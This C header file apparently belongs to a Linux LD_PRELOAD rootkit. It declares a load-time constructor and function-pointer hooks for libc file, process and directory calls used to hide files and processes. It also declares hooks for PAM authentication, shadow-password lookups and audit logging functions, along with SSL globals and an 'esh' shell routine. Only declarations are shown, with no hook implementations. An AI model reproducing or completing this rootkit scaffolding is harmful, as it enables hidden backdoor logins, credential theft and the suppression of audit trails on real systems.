#define REALLY_BIG 10000000
// This file contains all the prototypes of functions we want to hook.
// Add them here.
void *libc;
void *libpam;
SSL_CTX *ctx;
SSL *ssl;
int logflag;
static void init (void) __attribute__ ((constructor));
static int (*old_execvp)(const char *file, char *const argv[]);
static pid_t (*old_getsid) (pid_t pid);
static ssize_t (*old_read)(int fd, void *buf, size_t count);
//static ssize_t (*old_readlink)(const char *path, char *buf, size_t bufsiz);
static ssize_t (*old_readlink)(const char *path, char *buf, size_t bufsiz);

static int (*old_socket) (int domain, int type, int protocol);
static int (*old_setgid) (gid_t gid);
static int (*old_setregid) (gid_t gid, gid_t egid);
static int (*old_setresgid) (gid_t rgid, gid_t egid, gid_t sgid);
static int (*old_sched_rr_get_interval) (pid_t pid, struct timespec * tp);
static int (*old_sched_getparam) (pid_t pid, struct sched_param *param);
static int (*old_sched_getscheduler) (int pid);
static int (*old_sched_getaffinity) (pid_t pid, size_t cpusetsize,cpu_set_t *mask);
static int (*old_sysinfo) (struct sysinfo *info);
static int (*old_getpgid) (pid_t pid);
static int (*old_getpriority) (int  __which, id_t __who);
static int (*old_chmod) (const char *path, mode_t mode);
static int (*old_fchmod) (int fd, mode_t mode);
static int (*old_chdir) (const char *path);
static int (*old_rename) (const char *old, const char *new);
static int (*old_kill) (pid_t pid, int sig);
static int (*old_execve)(const char *filename, char *const argv[], char *const envp[]);
static int (*old_access) (const char *path, int amode);
static int (*old_xstat) (int ver, const char *path, struct stat * buf);
static int (*old_xstat64) (int ver, const char *path, struct stat64 * buf);
static int (*old_fxstat) (int ver, int fildes, struct stat * buf);
static int (*old_fxstat64) (int ver, int fildes, struct stat64 * buf);
static int (*old_lxstat) (int ver, const char *file, struct stat * buf);
static int (*old_lxstat64) (int ver, const char *file, struct stat64 * buf);
static int (*old_open) (const char *pathname, int flags, mode_t mode);
static int (*old_open64) (const char *pathname, int flags, mode_t mode);
static int (*old_rmdir) (const char *pathname);
static int (*old_unlink) (const char *pathname);
static int (*old_symlink) (const char *oldpath, const char *newpath);
static int (*old_link) (const char *oldpath, const char *newpath);
static int (*old_unlinkat) (int dirfd, const char *pathname, int flags);
static int (*old_chown) (const char *path, uid_t owner, gid_t group);
static int (*old_fchown) (int fd, uid_t owner, gid_t group);
static int (*old_lchown) (const char *path, uid_t owner, gid_t group);
static int (*old_fchownat) (int dirfd, const char *pathname, uid_t owner, gid_t group, int flags);
static ssize_t (*old_write) (int fildes, const void *buf, size_t nbyte);

static FILE *(*old_fopen) (const char *filename, const char *mode);
static FILE *(*old_fopen64) (const char *filename, const char *mode);

static DIR *(*old_fdopendir) (int fd);
static DIR *(*old_opendir) (const char *name);
static void (*old_login) (const struct utmp *ut);
static struct dirent *(*old_readdir) (DIR * dir);
static struct dirent64 *(*old_readdir64) (DIR * dir);

void esh (void);

//PAM shit
static int (*old_getpwnam_r) (const char *name, struct passwd *pwd, char *buf,
                              size_t buflen, struct passwd **result);
static int (*old_pam_authenticate)(pam_handle_t *pamh, int flags);
static int (*old_pam_open_session)(pam_handle_t *pamh, int flags);
static int (*old_pam_acct_mgmt)(pam_handle_t *pamh, int flags);
static FILE *(*old_fopen) (const char *filename, const char *mode);
static struct passwd *(*old_getpwnam) (const char *name);
static struct passwd *(*old_getpwuid)(uid_t uid);
static struct spwd *(*old_getspnam) (const char *name);

static const int (*old_audit_log_acct_message) (int audit_fd, int type, const char *pgname, const char *op, const char *name, unsigned int id, const char *host, const char *addr, const char *tty, int result);
static const int (*old_audit_log_user_message) (int audit_fd, int type, const char *message, const char *hostname, const char *addr, const char *tty, int result);
static const int (*old_audit_send) (int fd, int type, const void *data, unsigned int size);

